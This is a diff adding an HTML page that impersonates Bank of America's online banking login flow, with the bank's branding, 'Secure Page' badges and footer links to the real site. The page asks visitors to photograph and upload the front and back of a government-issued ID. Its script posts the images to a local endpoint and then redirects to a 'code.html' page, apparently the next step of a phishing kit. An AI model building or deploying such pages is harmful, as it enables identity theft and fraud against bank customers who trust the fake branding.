@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank of America | Online Banking | Log in | User ID</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style2.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+  
+    <style>
+    h2 {
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    form {
+      max-width: 420px;
+      display: flex;
+      margin: 10px 10px;
+      flex-direction: column;
+      gap: 25px;
+    }
+
+    .upload-label {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 140px;
+      padding: 20px;
+      background: #f9f9f9;
+      border: 2px dashed #ccc;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: border-color 0.3s ease;
+      overflow: hidden;
+    }
+
+    .upload-label:hover {
+      border-color: #007bff;
+    }
+
+    .upload-label img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      margin-bottom: 0;
+      opacity: 1;
+    }
+
+    .upload-label span {
+      font-size: 14px;
+      color: #666;
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    button {
+      background-color: #007bff;
+      color: #fff;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <section id="header2">
+    <a href="index.html" class="log">
+      <img src="img/Bank-of-America-Logo.png" width="300px" height="35px" class="logo" />
+    </a>
+    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
+  </section>
+
+  <section id="hero2">
+    <div class="bar">
+      <ul id="navbarr">
+        <h3>Identification Card</h3>
+      </ul>
+    </div>
+  </section>
+
+  <div class="container">
+    <div>
+      <h1>Upload Your ID for Verification</h1>
+      <p class="subtitle">
+        Please upload clear images of a valid government-issued ID for verification purposes. <br>
+        Accepted IDs: Driver’s License, National ID Card, or Passport.
+      </p>
+    </div>
+
+    <form action="/upload-id" method="POST" enctype="multipart/form-data">
+      <label for="front" class="upload-label">
+        <img id="frontPreview" src="https://img.icons8.com/ios-filled/100/id-verified.png" alt="Front ID">
+        <span>Upload Front ID</span>
+        <input type="file" name="front" id="front" accept="image/*" capture="environment" required>
+      </label>
+
+      <label for="back" class="upload-label">
+        <img id="backPreview" src="https://img.icons8.com/ios-filled/100/id-verified.png" alt="Back ID">
+        <span>Upload Back ID</span>
+        <input type="file" name="back" id="back" accept="image/*" capture="environment" required>
+      </label>
+
+      <button type="submit">Submit ID for Verification</button>
+    </form>
+
+    <script>
+      function previewImage(input, previewId) {
+        const file = input.files[0];
+        if (file) {
+          const reader = new FileReader();
+          reader.onload = function (e) {
+            document.getElementById(previewId).src = e.target.result;
+          };
+          reader.readAsDataURL(file);
+        }
+      }
+
+      document.getElementById("front").addEventListener("change", function () {
+        previewImage(this, "frontPreview");
+      });
+
+      document.getElementById("back").addEventListener("change", function () {
+        previewImage(this, "backPreview");
+      });
+
+      document.querySelector("form").addEventListener("submit", function (e) {
+        e.preventDefault(); // Prevent default form submission
+
+        const formData = new FormData(this); // Collect form data
+
+        fetch('/upload-id', {
+          method: 'POST',
+          body: formData,
+        })
+          .then(response => response.json())
+          .then(data => {
+            if (data.success) {
+              // Redirect to a success page or a new URL on success
+              window.location.href = 'code.html';  // Change to the desired redirect page
+            } else {
+              alert('Something went wrong! Please try again.');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred. Please try again.');
+          });
+      });
+    </script>
+
+    </form>
+  </div>
+  <script src="script.js"></script>
+</body>
+<footer>
+  <div class="gray-bground-skin">
+    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+    <div class="link-container">
+      <div class="link-row">
+        <a href="https://www.bankofamerica.com/security-center/privacy-overview/" target="_blank">Privacy</a>
+        <a href="https://www.bankofamerica.com/security-center/overview/" target="_blank">Security</a>
+        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+        <div class="clearboth"></div>
+      </div>
+    </div>
+    <p>
+      Bank of America, N.A. Member FDIC.
+      <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank">Equal Housing Lender</a>
+      <i class="fa fa-home"></i><br />© 2025 Bank of America Corporation.
+    </p>
+  </div>
+</footer>
+
+</html>
